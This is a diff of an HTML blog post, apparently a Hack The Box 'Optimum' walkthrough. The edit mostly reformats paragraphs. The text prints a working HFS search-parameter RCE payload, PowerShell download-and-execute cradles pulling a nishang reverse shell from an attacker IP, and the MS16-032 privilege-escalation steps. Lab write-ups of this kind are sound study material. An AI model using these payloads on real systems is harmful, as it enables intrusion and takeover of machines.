@@ -61,17 +61,27 @@ execute arbitrary programs via a %00 sequence in a search action.
 
 <p><img src="/img/optimum_3.png" alt="Optimum_3" /></p>
 
-<p>I&rsquo;m going to use this payload to test the RCE <code>?search=%00{.exec|ping+10.10.14.45.}</code>. And then when running tcpdump, we got a response from the Box!</p>
+<p>I&rsquo;m going to use this payload to test the RCE <code>?search=%00{.exec|ping+10.10.14.45.}</code>. You can read more about why I use that payload <a href="https://www.rejetto.com/wiki/index.php/HFS:_scripting_commands" target="_blank">here</a>.</p>
+
+<p>And then when running tcpdump, we got a response from the Box!</p>
 
 <p><img src="/img/optimum_4.png" alt="Optimum_4" /></p>
 
 <p>Sweet! Now we know that our RCE really work, let&rsquo;s create a powershell shell to communicate with the box! I&rsquo;m going to use <a href="https://github.com/samratashok/nishang" target="_blank">nishang</a> <a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1" target="_blank">Invoke-PowerShellTcp.ps1</a> here. Don&rsquo;t forget to add <code>Invoke-PowerShellTcp -Reverse -IPAddress Your_IP -Port Your_Port</code> by the end of the file.</p>
 
-<p>And then because most of Hack The Box boxes is made from 64 bit machine, I&rsquo;m assuming this one too. So let&rsquo;s try to call the 64 bit powershell and then ping our machine back with this payload <code>?search=%00{.exec|C%3a\Windows\Sysnative\WindowsPowershell\v1.0\powershell.exe+ping+10.10.14.45.}</code>. And yeah, don&rsquo;t forget to url encode our payload!</p>
+<p>And then because most of Hack The Box boxes is made from 64 bit machine, I&rsquo;m assuming this one too. So let&rsquo;s try to call the 64 bit powershell and then ping our machine back with this payload</p>
+
+<p><code>?search=%00{.exec|C%3a\Windows\Sysnative\WindowsPowershell\v1.0\powershell.exe+ping+10.10.14.45.}</code></p>
+
+<p>And yeah, don&rsquo;t forget to url encode our payload!</p>
 
 <p><img src="/img/optimum_5.png" alt="Optimum_5" /></p>
 
-<p>Nice! We got response from the box, turns out my assumption was right about this box being a 64 bit. Now let&rsquo;s try to call our nishang shell. I&rsquo;ll start by running webserver from my box and then let the box download the <code>.ps1</code> script, this is the payload that I use <code>?search=%00{.exec|C%3a\Windows\Sysnative\WindowsPowershell\v1.0\powershell.exe+IEX(New-Object+Net.WebClient).downloadstring('http%3a//10.10.14.45/Invoke-PowerShellTcp.ps1').}</code>.</p>
+<p>Nice! We got response from the box, turns out my assumption was right about this box being a 64 bit. Now let&rsquo;s try to call our nishang shell.</p>
+
+<p>I&rsquo;ll start by running webserver from my box and then let the box download the <code>.ps1</code> script, this is the payload that I use</p>
+
+<p><code>?search=%00{.exec|C%3a\Windows\Sysnative\WindowsPowershell\v1.0\powershell.exe+IEX(New-Object+Net.WebClient).downloadstring('http%3a//10.10.14.45/Invoke-PowerShellTcp.ps1').}</code></p>
 
 <p><img src="/img/optimum_6.png" alt="Optimum_6" /></p>
 
@@ -81,11 +91,23 @@ execute arbitrary programs via a %00 sequence in a search action.
 
 <h2 id="privilege-escalation">Privilege Escalation</h2>
 
-<p>Privilege escalation is pretty straight forward from here. Let&rsquo;s start by enumerating the system, in here I&rsquo;m going to use <a href="https://github.com/rasta-mouse/Sherlock/blob/master/Sherlock.ps1" target="_blank">Sherlock</a> to enumerate the system. Don&rsquo;t forget to add <code>Find-AllVulns</code> by the end of the code. Because our shell is already a powershell, I&rsquo;m going to use this command to download the <code>.ps1</code> script from my system. <code>IEX(New-Object Net.WebClient).downloadstring('http://10.10.14.45/Sherlock.ps1')</code></p>
+<p>Privilege escalation is pretty straight forward from here. Let&rsquo;s start by enumerating the system, in here I&rsquo;m going to use <a href="https://github.com/rasta-mouse/Sherlock/blob/master/Sherlock.ps1" target="_blank">Sherlock</a> to enumerate the system. Don&rsquo;t forget to add <code>Find-AllVulns</code> by the end of the code.</p>
+
+<p>Because our shell is already a powershell, I&rsquo;m going to use this command to download the <code>.ps1</code> script from my system.</p>
+
+<p><code>IEX(New-Object Net.WebClient).downloadstring('http://10.10.14.45/Sherlock.ps1')</code></p>
 
 <p><img src="/img/optimum_8.png" alt="Optimum_8" /></p>
 
-<p>From here, <code>Sherlock</code> indicating that this box appeared to be vulnerable to <code>MS16-032 Secondary Logon Handle Privilege Escalation</code>. From here I&rsquo;m going to use <a href="https://github.com/EmpireProject/Empire" target="_blank">Empire</a> <a href="https://github.com/EmpireProject/Empire/blob/master/data/module_source/privesc/Invoke-MS16032.ps1" target="_blank">Invoke-MS16032.ps1</a> script. Don&rsquo;t forget to add <code>Invoke-MS16032 -Command &quot;IEX(New-Object Net.WebClient).downloadstring('http://10.10.14.45/sh.ps1')&quot;</code> by the end of the script. I&rsquo;m going to use this payload to run the <code>Empire</code> script, <code>IEX(New-Object Net.WebClient).downloadstring('http://10.10.14.45/Invoke-MS16032.ps1')</code>.</p>
+<p>From here, <code>Sherlock</code> indicating that this box appeared to be vulnerable to <code>MS16-032 Secondary Logon Handle Privilege Escalation</code>.</p>
+
+<p>Because of that, I&rsquo;m going to use <a href="https://github.com/EmpireProject/Empire" target="_blank">Empire</a> <a href="https://github.com/EmpireProject/Empire/blob/master/data/module_source/privesc/Invoke-MS16032.ps1" target="_blank">Invoke-MS16032.ps1</a> script.</p>
+
+<p>Don&rsquo;t forget to add <code>Invoke-MS16032 -Command &quot;IEX(New-Object Net.WebClient).downloadstring('http://10.10.14.45/sh.ps1')&quot;</code> by the end of the script.</p>
+
+<p>I&rsquo;m going to use this payload to run the <code>Empire</code> script on the box.</p>
+
+<p><code>IEX(New-Object Net.WebClient).downloadstring('http://10.10.14.45/Invoke-MS16032.ps1')</code>.</p>
 
 <p><img src="/img/optimum_9.png" alt="Optimum_9" /></p>
 
